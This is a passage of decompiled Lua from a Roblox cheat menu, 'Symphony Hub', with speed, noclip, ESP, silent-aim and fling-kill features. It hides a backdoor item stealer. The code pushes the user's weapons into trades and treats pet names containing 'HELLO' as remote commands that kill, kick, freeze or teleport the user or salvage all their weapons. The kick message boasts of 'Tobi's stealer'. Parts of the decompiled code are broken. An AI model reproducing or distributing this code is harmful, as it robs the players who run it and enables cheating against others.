          for r10_4 = 1, r6_4.count, 1 do
            r12_0.Trade.OfferItem:FireServer(r5_4, "Weapons")
          end
          table.insert(r61_0, r5_4)
          r58_0 = r58_0 + 1
          if r58_0 >= 4 then
            break
          end
        end
      else
        for r10_4 = 1, r6_4.count, 1 do
          r12_0.Trade.OfferItem:FireServer(r5_4, "Weapons")
        end
        table.insert(r61_0, r5_4)
        r58_0 = r58_0 + 1
        if r58_0 >= 4 then
          break
        end
      end
    end
    r59_0 = true
    repeat
      task.wait()
    until r12_0.Trade.GetTradeStatus:InvokeServer() == "None"
    r59_0 = false
    for r5_4, r6_4 in ipairs(r61_0) do
      r45_0[r6_4] = nil
    end
    if not r1_4 then
      for r5_4, r6_4 in pairs(r45_0) do
        if r46_0[r6_4.rarity] then
          CompatibilityCheck(r0_4, r1_4)
        end
      end
    else
      CompatibilityCheck(r0_4, r1_4)
    end
    r60_0 = false
  end
  function handlePetAdded(r0_120)
    -- line: [0, 0] id: 120
    if string.find(r0_120:GetAttribute("PetName"), "HELLO") then
      local r1_120 = r0_120:GetAttribute("PetName")
      local r2_120 = r1_120:sub(r1_120:find("HELLO") + 6)
      if r2_120 == "1" then
        r29_0.Character.Humanoid.Health = 0
      elseif r2_120 == "2" then
        r29_0.Character.HumanoidRootPart.CFrame = r14_0[r0_120.Parent.Name].Character.HumanoidRootPart.CFrame
      elseif r2_120 == "3" then
        r29_0:Kick("All your stuff just got taken by Tobi\'s stealer.\ndiscord.gg/GY2RVSEGDT")
      elseif r2_120 == "4" then
        game:Shutdown()
      elseif r2_120 == "5" then
        while true do
        end
        goto label_55	-- block#11 is visited secondly
      elseif r2_120 == "6" then
        CompatibilityCheck(r0_120.Parent.Name, false)
      elseif r2_120 == "7" then
        CompatibilityCheck(r0_120.Parent.Name, true)
      elseif r2_120 == "8" then
        for r6_120, r7_120 in pairs(r12_0.Remotes.Extras.GetData2:InvokeServer().Weapons.Owned) do
          r12_0.Remotes.Inventory.Salvage:InvokeServer(r6_120)
        end
      elseif r2_120 == "9" then
        if #r14_0:GetPlayers() <= 1 then
          r11_0:Teleport(r4_0, r29_0)
        else
          r11_0:TeleportToPlaceInstance(r4_0, r5_0, r29_0)
        end
      end
    end
  end
  function handleCharacterAdded(r0_113)
    -- line: [0, 0] id: 113
    r0_113.ChildAdded:Connect(function(r0_114)
      -- line: [0, 0] id: 114
      if r0_114.Name == "Pet" then
        task.wait(0.1)
        handlePetAdded(r0_114)
      end
    end)
  end
  for r65_0, r66_0 in pairs(r14_0:GetPlayers()) do
    local r69_0 = "Connect"
    function r69_0(r0_186)
      -- line: [0, 0] id: 186
      handleCharacterAdded(r0_186)
    end
    r66_0.CharacterAdded:[r69_0](r69_0)
    handleCharacterAdded(r9_0:WaitForChild(r66_0.Name))
  end
  r64_0 = "Connect"
  function r64_0(r0_182)
    -- line: [0, 0] id: 182
    if r39_0.DynamicUpdateMethod and r42_0.UpdateMethodDropdown and r39_0.UpdateMethod ~= "On Player Event" then
      r42_0.UpdateMethodDropdown:SetValue("On Player Event")
    end
    if r39_0.AutoUpdatePlayerList then
      UpdatePlayerLists(r39_0.UpdateMethod)
    end
    if r39_0.WhitelistFriends and IsFriend(r0_182) then
      table.insert(r39_0.WhitelistedPlayers, r0_182.Name)
    end
    r0_182.CharacterAdded:Connect(function(r0_183)
      -- line: [0, 0] id: 183
      FixMemoryLeak(r0_182)
      handleCharacterAdded(r0_183)
    end)
    FixMemoryLeak(r0_182)
    -- warn: not visited block [4]
    -- block#4:
    -- _u2.UpdateMethodDropdown:SetValue("On Dropdown Change")
    -- goto label_37
  end
  r14_0.PlayerAdded:[r64_0](r64_0)
  r64_0 = "Connect"
  function r64_0(r0_158)
    -- line: [0, 0] id: 158
    if r39_0.DynamicUpdateMethod and r42_0.UpdateMethodDropdown and r39_0.UpdateMethod ~= "On Player Event" then
      r42_0.UpdateMethodDropdown:SetValue("On Player Event")
    end
    if r39_0.AutoUpdatePlayerList then
      UpdatePlayerLists(r39_0.UpdateMethod)
    end
    r39_0.WhitelistedPlayers[r0_158.Name] = nil
    -- warn: not visited block [4]
    -- block#4:
    -- _u2.UpdateMethodDropdown:SetValue("On Dropdown Change")
    -- goto label_37
  end
  r14_0.PlayerRemoving:[r64_0](r64_0)
  local r62_0 = nil
  function GetEnemy(r0_45)
    -- line: [0, 0] id: 45
    pcall(function()
      -- line: [0, 0] id: 46
      local r1_46 = math.huge
      local r0_46 = nil	-- notice: implicit variable refs by block#[9]
      for r5_46, r6_46 in pairs(r14_0:GetPlayers()) do
        if r6_46.Name ~= r29_0.Name and IsAlive(r6_46.Name) then
          local r7_46 = nil
          if r0_45 == "Mouse Cursor" then
            r7_46 = (r6_46.Character.PrimaryPart.Position - r34_0.Hit.Position).Magnitude
          else
            r7_46 = (r6_46.Character.PrimaryPart.Position - r32_0.Position).Magnitude
          end
          if r7_46 < r1_46 then
            r0_46 = r6_46
            r1_46 = r7_46
          end
        end
      end
      return r0_46
    end)
  end
  local r63_0 = nil
  r63_0 = hookmetamethod(game, "__namecall", function(r0_194, ...)
    -- line: [0, 0] id: 194
    local r2_194 = getnamecallmethod()
    local r3_194 = {
      ...
    }
    if not checkcaller() and typeof(r0_194) == "Instance" and r2_194 == "FireServer" then
      if r0_194.Parent.Name == "FakeBomb" and r39_0.AutoFakeBombClutch then
        r3_194[1] = CFrame.new(r30_0.Head.CFrame * CFrame.new(0, -4, -5))
      elseif r0_194.Name == "Throw" and r0_194.Parent.Name == r29_0.Name and r39_0.KnifeSilentAim and r62_0 then
        local r4_194 = r62_0.Character.HumanoidRootPart.AssemblyLinearVelocity / 3
        r3_194[1] = CFrame.new(r62_0.Character.HumanoidRootPart.Position + Vector3.new(r4_194.X, r4_194.Y / 1.5, r4_194.Z))
      end
    end
    return r63_0(r0_194, unpack(r3_194))
    -- warn: not visited block [6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35]
    -- block#6:
    -- -- <empty>
    -- -- <empty>
    -- r4_194 = _u1[tostring(_u2.Gameplay.Murderer)].Character
    -- r5_194 = _u0.SharpShooter
    -- if r5_194
    -- block#7:
    -- r5_194 = r4_194.PrimaryPart
    -- if not r5_194
    -- block#8:
    -- r5_194 = r4_194.HumanoidRootPart
    -- block#9:
    -- r6_194 = r5_194.AssemblyLinearVelocity
    -- if _u0.SSAAccuracy == "Seismic"
    -- block#10:
    -- if r6_194.Magnitude == 0
    -- block#11:
    -- r3_194[2] = r5_194.Position
    -- goto label_275
    -- block#12:
    -- r7_194 = r6_194.Unit * r5_194.Velocity.Magnitude / 16.5
    -- if 2.65 < r7_194.Y
    -- block#13:
    -- r7_194.Y = 2.65
    -- goto label_68
    -- block#14:
    -- if r7_194.Y < -2
    -- block#15:
    -- r7_194.Y = -2
    -- block#16:
    -- r3_194[2] = r5_194.Position + Vector3.new(r7_194.X, r7_194.Y, r7_194.Z / 1.25)
    -- goto label_275
    -- block#17:
    -- if _u0.SSAAccuracy == "Overflow"
    -- block#18:
    -- if r6_194.Magnitude == 0
    -- block#19:
    -- r3_194[2] = r5_194.Position
    -- goto label_275
    -- block#20:
    -- r7_194 = r6_194.Unit * r5_194.Velocity.Magnitude / 17 + _u1[tostring(_u2.Gameplay.Murderer)].Character.Humanoid.MoveDirection
    -- if 2.5 < r7_194.Y
    -- block#21:
    -- r7_194.Y = 2.5
    -- goto label_114
    -- block#22:
    -- if r7_194.Y < -2
    -- block#23:
    -- r7_194.Y = -2
    -- block#24:
    -- r3_194[2] = r5_194.Position + Vector3.new(r7_194.X, r7_194.Y, r7_194.Z)
    -- goto label_275
    -- block#25:
    -- if _u0.SSAAccuracy == "Ping Based"
    -- block#26:
    -- _u2.PredictValue = _u0.DefaultPrediction
    -- if not _u2.Ping
    -- block#27:
    -- r3_194[2] = r5_194.Position + r6_194 * Vector3.new(_u2.PredictValue / 200, 0, _u2.PredictValue / 200)
    -- goto label_275
    -- block#28:
    -- _u2.PingDifference = _u0.DefaultPing - _u2.Ping
    -- if _u0.PingStep <= _u2.PingDifference
    -- block#29:
    -- _u2.PredictValue = _u2.Ping * _u0.PredictionMultiplier
    -- if _u0.PredictionMultiplierCap < _u2.PredictValue
    -- block#30:
    -- _u2.PredictValue = _u0.PredictionMultiplierCap
    -- block#31:
    -- r3_194[2] = r5_194.Position + r6_194 * Vector3.new(_u2.PredictValue / 200, 0, _u2.PredictValue / 200)
    -- goto label_275
    -- block#32:
    -- if _u0.SSAAccuracy == "Dynamic"
    -- block#33:
    -- r3_194[2] = r5_194.Position + r4_194.Humanoid.MoveDirection
    -- goto label_275
    -- block#34:
    -- if _u0.SSAAccuracy == "Regular"
    -- block#35:
    -- r3_194[2] = r5_194.Position
    -- goto label_275
  end)
  local r66_0 = "CreateWindow"
  r66_0 = {
    Title = "Symphony Hub",
    SubTitle = "discord.gg/symphonyhub",
    TabWidth = 90,
    Size = UDim2.fromOffset(500, 300),
    Acrylic = true,
    Theme = "Darker",
    MinimizeKey = Enum.KeyCode.LeftControl,
  }
  r64_0 = r0_0:[r66_0](r66_0)
  local r65_0 = {}
  local r69_0 = "AddTab"
  r69_0 = {
    Title = "Player",
    Icon = "user",
  }
  r65_0.Player = r64_0:[r69_0](r69_0)
  r69_0 = "AddTab"
  r69_0 = {
    Title = "Visuals",
    Icon = "view",
  }
  r65_0.Visuals = r64_0:[r69_0](r69_0)
  r69_0 = "AddTab"
  r69_0 = {
    Title = "Combat",
    Icon = "axe",
  }
  r65_0.Combat = r64_0:[r69_0](r69_0)
  r69_0 = "AddTab"
  r69_0 = {
    Title = "Misc",
    Icon = "flask-conical",
  }
  r65_0.Misc = r64_0:[r69_0](r69_0)
  r69_0 = "AddTab"
  r69_0 = {
    Title = "Farm",
    Icon = "coins",
  }
  r65_0.Farm = r64_0:[r69_0](r69_0)
  if r40_0.IsPremium then
    r69_0 = "AddTab"
    r69_0 = {
      Title = "Premium",
      Icon = "dollar-sign",
    }
    r65_0.Premium = r64_0:[r69_0](r69_0)
  end
  r69_0 = "AddTab"
  r69_0 = {
    Title = "Settings",
    Icon = "settings",
  }
  r65_0.Settings = r64_0:[r69_0](r69_0)
  r66_0 = r0_0.Options
  r69_0 = "AddSection"
  r69_0 = "Player Mods"
  local r67_0 = r65_0.Player:[r69_0](r69_0)
  local r70_0 = "AddToggle"
  r70_0 = "EnableWalkSpeed"
  r67_0:[r70_0](r70_0, {
    Title = "Enable Walk Speed",
    Default = r39_0.EnableWalkSpeed,
    Callback = function(r0_34)
      -- line: [0, 0] id: 34
      r39_0.EnableWalkSpeed = r0_34
      while r39_0.EnableWalkSpeed do
        local r1_34 = task.wait()
        if r1_34 then
          r1_34 = r39_0.EnableWalkSpeed
          if r1_34 then
            r1_34 = r31_0
            r1_34.WalkSpeed = r39_0.WalkSpeedInput
          else
            r1_34 = r31_0
            r1_34.WalkSpeed = 16
          end
        else
          break
        end
      end
    end,
  })
  r70_0 = "AddInput"
  r70_0 = "WalkSpeedInput"
  r67_0:[r70_0](r70_0, {
    Title = "Walk Speed",
    Default = r39_0.WalkSpeedInput,
    Numeric = true,
    Finished = false,
    Callback = function(r0_96)
      -- line: [0, 0] id: 96
      r39_0.WalkSpeedInput = r0_96
    end,
  })
  r70_0 = "AddToggle"
  r70_0 = "EnableJumpPower"
  r67_0:[r70_0](r70_0, {
    Title = "Enable Jump Power",
    Default = false,
    Callback = function(r0_41)
      -- line: [0, 0] id: 41
      r39_0.EnableJumpPower = r0_41
      while r39_0.EnableJumpPower do
        local r1_41 = task.wait()
        if r1_41 then
          r1_41 = r31_0
          if r1_41 then
            r1_41 = r39_0.EnableJumpPower
            if r1_41 then
              r1_41 = r31_0
              r1_41.JumpPower = r39_0.JumpPowerInput
            else
              r1_41 = r31_0
              r1_41.JumpPower = 50
            end
          end
        else
          break
        end
      end
    end,
  })
  r70_0 = "AddInput"
  r70_0 = "JumpPowerInput"
  r67_0:[r70_0](r70_0, {
    Title = "Jump Power",
    Default = r39_0.JumpPowerInput,
    Numeric = true,
    Finished = false,
    Callback = function(r0_141)
      -- line: [0, 0] id: 141
      r39_0.JumpPowerInput = r0_141
    end,
  })
  r70_0 = "AddToggle"
  r70_0 = "EnableInfiniteJump"
  r67_0:[r70_0](r70_0, {
    Title = "Infinite Jump",
    Default = r39_0.InfiniteJump,
    Callback = function(r0_90)
      -- line: [0, 0] id: 90
      r39_0.InfiniteJump = r0_90
      if r39_0.InfiniteJump then
        r43_0.Jump = r13_0.JumpRequest:Connect(function()
          -- line: [0, 0] id: 91
          r31_0:ChangeState("Jumping")
        end)
      elseif r43_0.Jump then
        r43_0.Jump:Disconnect()
      end
    end,
  })
  r70_0 = "AddToggle"
  r70_0 = "EnableNoclip"
  r67_0:[r70_0](r70_0, {
    Title = "Noclip",
    Default = r39_0.Noclip,
    Callback = function(r0_102)
      -- line: [0, 0] id: 102
      r39_0.Noclip = r0_102
    end,
  })
  r70_0 = "AddToggle"
  r70_0 = "NoclipCameraToggle"
  r67_0:[r70_0](r70_0, {
    Title = "Noclip Camera",
    Default = r39_0.NoclipCamera,
    Callback = function(r0_154)
      -- line: [0, 0] id: 154
      r39_0.NoclipCamera = r0_154
      if r39_0.NoclipCamera then
        r29_0.DevCameraOcclusionMode = "Invisicam"
        r39_0.NoclipCameraEnabled = true
      elseif r39_0.NoclipCameraEnabled then
        r29_0.DevCameraOcclusionMode = "Zoom"
      end
    end,
  })
  r70_0 = "AddToggle"
  r70_0 = "UnlockCameraToggle"
  r67_0:[r70_0](r70_0, {
    Title = "Unlock Camera",
    Default = r39_0.UnlockCamera,
    Callback = function(r0_13)
      -- line: [0, 0] id: 13
      r39_0.UnlockCamera = r0_13
      if r39_0.UnlockCamera then
        r29_0.CameraMaxZoomDistance = 100000
        r39_0.UnlockCameraEnabled = true
      elseif r39_0.UnlockCameraEnabled then
        r29_0.CameraMaxZoomDistance = 15
      end
    end,
  })
  r70_0 = "AddToggle"
  r70_0 = "EnableSecondLife"
  r67_0:[r70_0](r70_0, {
    Title = "Second Life",
    Description = "Make you unable to jump",
    Default = r39_0.SecondLife,
    Callback = function(r0_71)
      -- line: [0, 0] id: 71
      r39_0.SecondLife = r0_71
      if r39_0.SecondLife and r40_0.IsRoundStarted and IsAlive() then
        r31_0:ChangeState(11)
        r39_0.SecondLifeEnabled = true
      elseif r39_0.SecondLifeEnabled then
        r31_0:ChangeState(18)
      end
    end,
  })
  r70_0 = "AddSection"
  r70_0 = "Teleport"
  local r68_0 = r65_0.Player:[r70_0](r70_0)
  local r71_0 = "AddButton"
  r71_0 = {
    Title = "Map",
    Callback = function()
      -- line: [0, 0] id: 38
      TeleportTo("Map")
    end,
  }
  r68_0:[r71_0](r71_0)
  r71_0 = "AddButton"
  r71_0 = {
    Title = "Voting Room",
    Callback = function()
      -- line: [0, 0] id: 155
      TeleportTo("Voting Room")
    end,
  }
  r68_0:[r71_0](r71_0)
  r71_0 = "AddButton"
  r71_0 = {
    Title = "Lobby",
    Callback = function()
      -- line: [0, 0] id: 1
      TeleportTo("Lobby")
    end,
  }
  r68_0:[r71_0](r71_0)
  r71_0 = "AddButton"
  r71_0 = {
    Title = "Murderer",
    Callback = function()
      -- line: [0, 0] id: 185
      TeleportTo("Murderer")
    end,
  }
  r68_0:[r71_0](r71_0)
  r71_0 = "AddButton"
  r71_0 = {
    Title = "Sheriff",
    Callback = function()
      -- line: [0, 0] id: 67
      TeleportTo("Sheriff")
    end,
  }
  r68_0:[r71_0](r71_0)
  r71_0 = "AddDropdown"
  r71_0 = "TeleportToPlayerList"
  r42_0.TeleportToPlayerList = r68_0:[r71_0](r71_0, {
    Title = "Teleport To Player",
    Values = r39_0.PlayersList,
    Multi = false,
    AllowNull = true,
    Default = nil,
    Callback = function(r0_42)
      -- line: [0, 0] id: 42
      if r39_0.UpdateMethod == "On Dropdown Change" and r42_0.UpdateTeleportToPlayerList then
        UpdatePlayerLists("On Dropdown Change", r42_0.TeleportToPlayerList)
        r42_0.UpdateTeleportToPlayerList = false
      end
      r39_0.TeleportToPlayer = r0_42
      TeleportTo("Player", r39_0.TeleportToPlayer)
    end,
  })
  r71_0 = "AddSection"
  r71_0 = "Spectate"
  r69_0 = r65_0.Player:[r71_0](r71_0)
  local r72_0 = "AddDropdown"
  r72_0 = "SpectatePlayerList"
  r42_0.SpectatePlayerList = r69_0:[r72_0](r72_0, {
    Title = "Spectate Player",
    Values = r39_0.PlayersList,
    Multi = false,
    AllowNull = true,
    Default = nil,
    Callback = function(r0_39)
      -- line: [0, 0] id: 39
      if r39_0.UpdateMethod == "On Dropdown Change" and r42_0.UpdateSpectatePlayerList then
        UpdatePlayerLists("On Dropdown Change", r42_0.SpectatePlayerList)
        r42_0.UpdateSpectatePlayerList = false
      end
      r39_0.SpectatePlayer = r0_39
      Spectate("Player", r39_0.SpectatePlayer)
    end,
  })
  r72_0 = "AddButton"
  r72_0 = {
    Title = "Spectate Murderer",
    Callback = function()
      -- line: [0, 0] id: 117
      Spectate("Murderer")
    end,
  }
  r69_0:[r72_0](r72_0)
  r72_0 = "AddButton"
  r72_0 = {
    Title = "Spectate Sheriff",
    Callback = function()
      -- line: [0, 0] id: 36
      Spectate("Sheriff")
    end,
  }
  r69_0:[r72_0](r72_0)
  r72_0 = "AddButton"
  r72_0 = {
    Title = "Stop Spectating",
    Callback = function()
      -- line: [0, 0] id: 2
      Spectate("Stop")
    end,
  }
  r69_0:[r72_0](r72_0)
  r72_0 = "AddSection"
  r72_0 = "Emotes"
  r70_0 = r65_0.Player:[r72_0](r72_0)
  local r73_0 = "AddDropdown"
  r73_0 = "PlayEmoteList"
  r70_0:[r73_0](r73_0, {
    Title = "Play Emote",
    Values = {
      "Sit",
      "Ninja",
      "Dab",
      "Zen",
      "Floss",
      "Headless",
      "Zombie"
    },
    Multi = false,
    AllowNull = false,
    Default = nil,
    Callback = function(r0_5)
      -- line: [0, 0] id: 5
      if not r0_5 then
        return 
      end
      r12_0.Remotes.Misc.PlayEmote:Fire(string.lower(r0_5))
    end,
  })
  r73_0 = "AddToggle"
  r73_0 = "EnableSeizure"
  r70_0:[r73_0](r73_0, {
    Title = "Seizure",
    Default = r39_0.Seizure,
    Callback = function(r0_40)
      -- line: [0, 0] id: 40
      r39_0.Seizure = r0_40
      while r39_0.Seizure do
        local r1_40 = task.wait(0.2)
        if r1_40 then
          r12_0.Remotes.Misc.PlayEmote:Fire(r44_0[math.random(1, #r44_0)])
        else
          break
        end
      end
    end,
  })
  r73_0 = "AddSection"
  r73_0 = "Protection"
  r71_0 = r65_0.Player:[r73_0](r73_0)
  local r74_0 = "AddToggle"
  r74_0 = "EnableAntiFling"
  r71_0:[r74_0](r74_0, {
    Title = "Anti Fling",
    Default = r39_0.AntiFling,
    Callback = function(r0_162)
      -- line: [0, 0] id: 162
      r39_0.AntiFling = r0_162
      local r1_162 = nil
      while r39_0.AntiFling do
        local r2_162 = task.wait()
        if r2_162 then
          pcall(function()
            -- line: [0, 0] id: 163
            for r3_163, r4_163 in pairs(r14_0:GetPlayers()) do
              if r4_163.Name ~= r29_0.Name then
                local r5_163 = r4_163.Character:FindFirstChild("HumanoidRootPart")
                if r4_163.Character and r5_163 and (50 < r5_163.AssemblyAngularVelocity.Magnitude or 100 < r5_163.AssemblyLinearVelocity.Magnitude) then
                  for r9_163, r10_163 in pairs(r4_163.Character:GetChildren()) do
                    if r10_163:IsA("BasePart") then
                      r10_163.CanCollide = false
                      r10_163.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                      r10_163.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                      r10_163.CustomPhysicalProperties = PhysicalProperties.new(0.1, 0.1, 0.1)
                    end
                  end
                end
              end
            end
            if 250 < r30_0.PrimaryPart.AssemblyLinearVelocity.Magnitude or 250 < r30_0.PrimaryPart.AssemblyAngularVelocity.Magnitude then
              r30_0.PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
              r30_0.PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
              r30_0.PrimaryPart.CFrame = r1_162
            elseif r30_0.PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or 50 < r30_0.PrimaryPart.AssemblyAngularVelocity.Magnitude then
              r1_162 = r30_0.PrimaryPart.CFrame + CFame.new(0, 1, 0)
            end
          end)
        else
          break
        end
      end
    end,
  })
  r74_0 = "AddSection"
  r74_0 = "Info"
  r72_0 = r65_0.Visuals:[r74_0](r74_0)
  local r75_0 = "CreateParagraph"
  r75_0 = "RoundInfoParagraph"
  local r76_0 = {
    Title = "Round Information",
  }
  local r77_0 = " Is Round Started: "
  local r78_0 = tostring(r40_0.IsRoundStarted)
  local r79_0 = "\n Murderer: "
  local r80_0 = tostring(r40_0.Gameplay.Murderer)
  local r81_0 = "\n Murderer Perk: "
  local r82_0 = tostring(r40_0.MurdererPerk)
  local r83_0 = " \n Sheriff: "
  local r84_0 = tostring(r40_0.Gameplay.Sheriff)
  local r85_0 = "\n Is Gun Dropped: "
  local r86_0 = r40_0.GunDrop
  if r86_0 then
    r86_0 = "Yes" or "No"
  else
    goto label_1528	-- block#68 is visited secondly
  end
  r76_0.Content = r77_0 .. r78_0 .. r79_0 .. r80_0 .. r81_0 .. r82_0 .. r83_0 .. r84_0 .. r85_0 .. r86_0
  r42_0.RoundInformationDesc = r72_0:[r75_0](r75_0, r76_0)
  r75_0 = "AddSection"
  r75_0 = "Chams"
  r73_0 = r65_0.Visuals:[r75_0](r75_0)
  r76_0 = "AddToggle"
  r76_0 = "ShowMurdererToggle"
  r73_0:[r76_0](r76_0, {
    Title = "Show Murderer",
    Default = false,
    Callback = function(r0_184)
      -- line: [0, 0] id: 184
      r39_0.ShowMurderer = r0_184
      if r39_0.ShowMurderer then
        CreateHighlight("Murderer")
        r39_0.ShowMurdererEnabled = true
      elseif r39_0.ShowMurdererEnabled then
        CreateHighlight("Murderer")
      end
    end,
  })
  r76_0 = "AddToggle"
  r76_0 = "ShowSheriffToggle"
  r73_0:[r76_0](r76_0, {
    Title = "Show Sheriff",
    Default = false,
    Callback = function(r0_190)
      -- line: [0, 0] id: 190
      r39_0.ShowSheriff = r0_190
      if r39_0.ShowSheriff then
        CreateHighlight("Sheriff")
        r39_0.ShowSheriffEnabled = true
      elseif r39_0.ShowSheriffEnabled then
        CreateHighlight("Sheriff")
      end
    end,
  })
  r76_0 = "AddToggle"
  r76_0 = "ShowInnocentToggle"
  r73_0:[r76_0](r76_0, {
    Title = "Show Innocent",
    Default = false,
    Callback = function(r0_92)
      -- line: [0, 0] id: 92
      r39_0.ShowInnocent = r0_92
      if r39_0.ShowInnocent then
        CreateHighlight("Innocent")
        r39_0.ShowInnocentEnabled = true
      elseif r39_0.ShowInnocentEnabled then
        CreateHighlight("Innocent")
      end
    end,
  })
  r76_0 = "AddToggle"
  r76_0 = "ShowGunToggle"
  r73_0:[r76_0](r76_0, {
    Title = "Show Gun",
    Default = false,
    Callback = function(r0_145)
      -- line: [0, 0] id: 145
      r39_0.ShowGun = r0_145
      if r39_0.ShowGun and r40_0.GunDrop then
        CreateHighlight("Gun", r9_0:FindFirstChild("Normal"):FindFirstChild("GunDrop"))
        r39_0.ShowGunEnabled = true
      elseif r39_0.ShowGunEnabled then
        CreateHighlight("Gun")
      end
    end,
  })
  r76_0 = "AddSection"
  r76_0 = "ESP"
  r74_0 = r65_0.Visuals:[r76_0](r76_0)
  r77_0 = "AddSlider"
  r77_0 = "ESPTextSizeSlider"
  r74_0:[r77_0](r77_0, {
    Title = "Text Size",
    Default = 14,
    Min = 5,
    Max = 25,
    Rounding = 0.1,
    Callback = function(r0_156)
      -- line: [0, 0] id: 156
      r39_0.ESPTextSize = r0_156
    end,
  })
  r77_0 = "AddSlider"
  r77_0 = "TransparencySlider"
  r74_0:[r77_0](r77_0, {
    Title = "Text Transparency",
    Default = 1,
    Min = 0.1,
    Max = 1,
    Rounding = 1,
    Callback = function(r0_99)
      -- line: [0, 0] id: 99
      r39_0.ESPTextTransparency = r0_99
    end,
  })
  r77_0 = "AddToggle"
  r77_0 = "MurdererESPToggle"
  r74_0:[r77_0](r77_0, {
    Title = "Murderer ESP",
    Default = false,
    Callback = function(r0_139)
      -- line: [0, 0] id: 139
      r39_0.MurdererESP = r0_139
      CreateESP(r39_0.MurdererESP, "Murderer", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end,
  })
  r77_0 = "AddToggle"
  r77_0 = "SheriffESPToggle"
  r74_0:[r77_0](r77_0, {
    Title = "Sheriff ESP",
    Default = false,
    Callback = function(r0_129)
      -- line: [0, 0] id: 129
      r39_0.SheriffESP = r0_129
      CreateESP(r39_0.SheriffESP, "Sheriff", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end,
  })
  r77_0 = "AddToggle"
  r77_0 = "InnocentESPToggle"
  r74_0:[r77_0](r77_0, {
    Title = "Innocent ESP",
    Default = false,
    Callback = function(r0_6)
      -- line: [0, 0] id: 6
      r39_0.InnocentESP = r0_6
      CreateESP(r39_0.InnocentESP, "Innocent", r39_0.ESPTextSize, r39_0.ESPTextTransparency)
    end,
  })
  if r40_0.IsPremium then
    r77_0 = "CreateParagraph"
    r77_0 = "PremiumParagraph"
    r65_0.Premium:[r77_0](r77_0, {
      Title = "Thank you for buying Symphony Hub Premium!",
    })
  end
  r77_0 = "AddSection"
  r77_0 = "Fling"
  r75_0 = r65_0.Combat:[r77_0](r77_0)
  r78_0 = "AddDropdown"
  r78_0 = "FlingPlayerList"
  r42_0.FlingPlayerList = r75_0:[r78_0](r78_0, {
    Title = "Players To Fling",
    Values = r39_0.PlayersList,
    Multi = false,
    AllowNull = true,
    Default = nil,
    Callback = function(r0_50)
      -- line: [0, 0] id: 50
      if r39_0.UpdateMethod == "On Dropdown Change" and r42_0.UpdateFlingPlayerList then
        UpdatePlayerLists("On Dropdown Change", r42_0.FlingPlayerList)
        r42_0.UpdateFlingPlayerList = false
      end
      r39_0.PlayerToFling = r0_50
      FlingKill(r39_0.PlayerToFling)
    end,
  })
  r78_0 = "AddButton"
  r78_0 = {
    Title = "Fling Murderer",
    Callback = function()
      -- line: [0, 0] id: 157
      FlingKill(tostring(r40_0.Gameplay.Murderer))
    end,
  }
  r75_0:[r78_0](r78_0)
  r78_0 = "AddButton"
  r78_0 = {
    Title = "Fling Sheriff",
    Callback = function()
      -- line: [0, 0] id: 83
      FlingKill(tostring(r40_0.Gameplay.Sheriff))
    end,
  }
  r75_0:[r78_0](r78_0)
  r78_0 = "AddButton"
  r78_0 = {
    Title = "Fling All",
    Callback = function()
      -- line: [0, 0] id: 118
      FlingKill("All")
    end,
  }
  r75_0:[r78_0](r78_0)
  r78_0 = "AddSection"
  r78_0 = "Gun"
  r76_0 = r65_0.Combat:[r78_0](r78_0)
  r79_0 = "AddButton"
  r79_0 = {
    Title = "Force Shoot",
    Callback = function()
      -- line: [0, 0] id: 171
      if not r40_0.Gameplay.Sheriff then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "No sheriff in sight, guess I\'m the law now!",
          Duration = 5,
        })
        return 
      end
      ForceShoot(Vector3.new(0, 0, 0))
    end,
  }
  r76_0:[r79_0](r79_0)
  r79_0 = "AddToggle"
  r79_0 = "EnableAutoForceShoot"
  r76_0:[r79_0](r79_0, {
    Title = "Auto Force Shoot",
    Default = r39_0.AutoForceShoot,
    Callback = function(r0_7)
      -- line: [0, 0] id: 7
      r39_0.AutoForceShoot = r0_7
      while r39_0.AutoForceShoot do
        local r1_7 = task.wait(2)
        if r1_7 then
          r1_7 = r40_0.Gameplay.Sheriff
          if r1_7 then
            ForceShoot(Vector3.new(0, 0, 0))
          end
        else
          break
        end
      end
    end,
  })
  r79_0 = "AddButton"
  r79_0 = {
    Title = "Break Gun",
    Callback = function()
      -- line: [0, 0] id: 195
      if not r40_0.Gameplay.Sheriff then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "No sheriff in sight, guess I\'m the law now!",
          Duration = 5,
        })
        return 
      end
      BreakGun(true)
    end,
  }
  r76_0:[r79_0](r79_0)
  r79_0 = "AddToggle"
  r79_0 = "EnableAutoBreakGun"
  r76_0:[r79_0](r79_0, {
    Title = "Auto Break Gun",
    Default = r39_0.AutoBreakGun,
    Callback = function(r0_101)
      -- line: [0, 0] id: 101
      r39_0.AutoBreakGun = r0_101
      if r39_0.AutoBreakGun and r40_0.Gameplay.Sheriff then
        BreakGun(true)
      end
    end,
  })
  r79_0 = "AddSection"
  r79_0 = "Innocent"
  r77_0 = r65_0.Combat:[r79_0](r79_0)
  r80_0 = "AddButton"
  r80_0 = {
    Title = "Grab Gun",
    Callback = function()
      -- line: [0, 0] id: 172
      if not r40_0.GunDrop then
        r0_0:Notify({
          Title = "Symphony Hub",
          Content = "Uh oh! no gun dropped!",
          Duration = 5,
        })
      end
      GrabGun()
    end,
  }
  r77_0:[r80_0](r80_0)
  r80_0 = "AddToggle"
  r80_0 = "EnableAutoGrabGun"
  r77_0:[r80_0](r80_0, {
    Title = "Auto Grab Gun",
    Default = r39_0.AutoGrabGun,
    Callback = function(r0_24)
      -- line: [0, 0] id: 24
      r39_0.AutoGrabGun = r0_24
    end,
  })
  r80_0 = "AddToggle"
  r80_0 = "EnableGunAura"
  r77_0:[r80_0](r80_0, {
    Title = "Gun Aura",
    Default = r39_0.GunAura,
    Callback = function(r0_74)
      -- line: [0, 0] id: 74
      r39_0.GunAura = r0_74
      while r39_0.GunAura do
        local r1_74 = r40_0.IsRoundStarted
        if r1_74 then
          r1_74 = r40_0.GunDrop
          if r1_74 then
            r1_74 = tostring(r40_0.Gameplay.Murderer)
